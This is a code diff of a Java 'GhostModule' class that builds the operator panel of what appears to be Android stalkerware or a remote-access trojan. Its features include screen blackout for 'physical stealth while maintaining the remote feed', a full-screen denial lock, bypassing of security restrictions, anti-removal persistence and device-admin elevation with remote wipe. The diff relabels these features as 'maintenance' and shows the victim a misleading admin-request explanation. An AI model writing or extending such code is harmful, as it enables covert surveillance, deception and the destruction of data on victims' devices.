@@ -368,37 +368,17 @@ public class GhostModule extends BaseModule {
 
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;\">");
         
-        // 1. Blackout Protocol
-        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">BLACKOUT_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_PROTOCOL', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
-        html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
-        html.append("</div>");
+        // 1. Maintenance Sequences (2x2 Grid: Repair, Optimize, Inject Trust, Heal)
+        html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03);\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.7rem;\">MAINTENANCE_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'MAINTENANCE_SEQUENCES', 'Execute system maintenance, telemetry re-synchronization, power optimization, and environment repair protocols.')\">INFO</span></div>");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_REPAIR</button>");
+        html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">OPTIMIZE_LINK</button>");
+        html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">INJECT_TRUST</button>");
+        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_HEAL</button>");
+        html.append("</div></div>");
 
-        // 2. System Denial Lock
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
-        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
-        html.append("</div>");
-
-        // 3. Maintenance: Repair Uplink
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,157,0,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--neon-orange); font-size: 0.7rem;\">REPAIR_LINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'REPAIR_LINK', 'Re-synchronize background telemetry and request critical environment permissions.')\">INFO</span></div>");
-        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 15px 0 0 0;\">INITIATE_REPAIR</button>");
-        html.append("</div>");
-
-        // 4. Maintenance: Optimize Stability
-        html.append("<div class=\"info-item\" style=\"background: rgba(57,255,20,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--neon-green); font-size: 0.7rem;\">OPTIMIZE_LINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'OPTIMIZE_LINK', 'Modify power management rules to exclude the service from battery-saving restrictions.')\">INFO</span></div>");
-        html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 15px 0 0 0;\">OPTIMIZE_LINK</button>");
-        html.append("</div>");
-
-        // 5. Maintenance: Bypass Restrictions
-        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.7rem;\">BYPASS_LIMITS <span class=\"info-trigger\" onclick=\"showInfo(event, 'BYPASS_LIMITS', 'Utilize the Session Installation API to unlock settings restricted by system security layers.')\">INFO</span></div>");
-        html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 15px 0 0 0;\">INJECT_TRUST</button>");
-        html.append("</div>");
-
-        // 6. Maintenance: Deep Repair Actions
+        // 2. Deep Repair Sequences
         html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
         html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">DEEP_REPAIR_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEEP_REPAIR', 'Direct system shortcuts to manually grant blocked permissions or handle OS security layers.')\">INFO</span></div>");
         html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
@@ -408,17 +388,33 @@ public class GhostModule extends BaseModule {
         html.append("<button onclick=\"dispatchPermissionSequence()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">PROMPTS</button>");
         html.append("</div></div>");
 
-        // 7. Auto Pilot & Anti-Removal (Legacy Controls)
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03); grid-column: 1 / -1;\">");
+        // 3. Automation & Persistence
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03);\">");
         html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
-        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; margin-top: 10px;\">");
-        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">INITIATE_HEAL</button>");
+        html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px;\">");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
-        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
-        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
-        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">ELEVATE_ADMIN</button>");
+        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
+        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"width:100%; border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
         html.append("</div></div>");
+
+        // 4. Blackout Protocol
+        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">BLACKOUT_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_PROTOCOL', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
+        html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
+        html.append("</div>");
+
+        // 5. System Denial Lock
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
+        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
+        html.append("</div>");
+
+        // 6. Device Admin Elevation Section (Purple Card - Matching Blackout Protocol Button Style)
+        html.append("<div class=\"info-item\" style=\"background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);\">");
+        html.append("<div class=\"info-label\" style=\"color: #a855f7; font-size: 0.7rem; font-weight: bold; letter-spacing: 1px;\">ADMIN_ELEVATION <span class=\"info-trigger\" style=\"border-color: rgba(168, 85, 247, 0.5); color: #a855f7;\" onclick=\"showInfo(event, 'ADMIN_ELEVATION', 'Enforce Device Administration policies on the target device. Grants elevated system administration protocols including remote instant screen locking, emergency data wipe, and anti-uninstall protection.')\">INFO</span></div>");
+        html.append("<button id=\"elevate-admin-btn\" onclick=\"ghostAction('elevateAdmin')\" class=\"btn btn-small\" style=\"width: 100% !important; margin: 15px 0 0 0; border-color: #a855f7; color: #a855f7; background: rgba(168, 85, 247, 0.1); font-weight: bold;\">ELEVATE_ADMIN</button>");
+        html.append("</div>");
         
         html.append("</div></div>");
 
@@ -678,14 +674,11 @@ public class GhostModule extends BaseModule {
                         Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
-                        IO_Persistence_Manager ghostService = IO_Persistence_Manager.getInstance();
-                        if (ghostService != null) {
-                            ghostService.startActivity(intent);
-                        } else {
-                            context.startActivity(intent);
-                        }
+                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
+                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                        wrapperIntent.putExtra("launch_admin", true);
+                        context.startActivity(wrapperIntent);
                     } catch (Exception e) {
                         android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
                     }
